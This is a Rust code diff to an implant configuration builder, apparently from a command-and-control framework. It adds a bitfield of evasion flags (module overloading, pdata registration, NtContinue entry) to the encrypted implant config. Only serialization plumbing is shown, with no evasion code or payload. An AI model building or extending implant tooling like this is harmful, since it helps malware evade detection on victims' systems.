@@ -56,6 +56,7 @@ mod config_field {
     pub const SLEEP_JITTER: u8 = 0x85;
     pub const KILL_DATE: u8 = 0x86;
     pub const PROFILE_BLOB: u8 = 0x87;
+    pub const EVASION_FLAGS: u8 = 0x88;
 }
 
 /// Generate a complete implant config blob.
@@ -67,12 +68,55 @@ mod config_field {
 /// 4. Derive a per-build encryption key from implant+server shared secret.
 /// 5. Encrypt the serialized config with ChaCha20-Poly1305.
 /// 6. Return encrypted blob + implant public key.
+/// Evasion feature flags (bitfield serialized into config TLV).
+#[derive(Debug, Clone, Copy, Default)]
+pub struct EvasionFlags {
+    pub module_overloading: bool,
+    pub pdata_registration: bool,
+    pub ntcontinue_entry: bool,
+}
+
+impl EvasionFlags {
+    /// Pack into a single byte bitfield for TLV serialization.
+    pub fn to_byte(&self) -> u8 {
+        let mut flags = 0u8;
+        if self.module_overloading {
+            flags |= 0x01;
+        }
+        if self.pdata_registration {
+            flags |= 0x02;
+        }
+        if self.ntcontinue_entry {
+            flags |= 0x04;
+        }
+        flags
+    }
+}
+
 pub fn generate_config(
     profile: &Profile,
     server_pubkey: &PublicKey,
     channels: &[ChannelConfig],
     sleep_config: &SleepConfig,
     kill_date: Option<i64>,
+) -> Result<GeneratedConfig, BuilderError> {
+    generate_config_with_evasion(
+        profile,
+        server_pubkey,
+        channels,
+        sleep_config,
+        kill_date,
+        EvasionFlags::default(),
+    )
+}
+
+pub fn generate_config_with_evasion(
+    profile: &Profile,
+    server_pubkey: &PublicKey,
+    channels: &[ChannelConfig],
+    sleep_config: &SleepConfig,
+    kill_date: Option<i64>,
+    evasion: EvasionFlags,
 ) -> Result<GeneratedConfig, BuilderError> {
     if channels.is_empty() {
         return Err(BuilderError::Config(
@@ -130,6 +174,12 @@ pub fn generate_config(
 
     // Compiled profile blob
     tlv_bytes(&mut plaintext, config_field::PROFILE_BLOB, &profile_blob);
+
+    // Evasion flags (single byte bitfield)
+    let evasion_byte = evasion.to_byte();
+    if evasion_byte != 0 {
+        tlv_bytes(&mut plaintext, config_field::EVASION_FLAGS, &[evasion_byte]);
+    }
 
     // 4. Derive per-build encryption key from DH shared secret
     let shared_secret = implant_secret.diffie_hellman(server_pubkey);
